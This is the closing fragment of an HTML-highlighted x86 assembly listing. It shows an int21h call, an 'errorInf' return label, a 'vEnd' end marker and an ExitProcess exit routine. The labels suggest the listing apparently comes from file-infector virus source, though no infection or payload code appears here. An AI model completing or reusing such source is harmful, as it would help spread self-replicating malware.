        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">

</span><span class="sc5">errorInf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">vEnd</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc9">Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0">     </span><span class="sc5">inicio</span><span class="sc0">
</span></div></body>
</html>
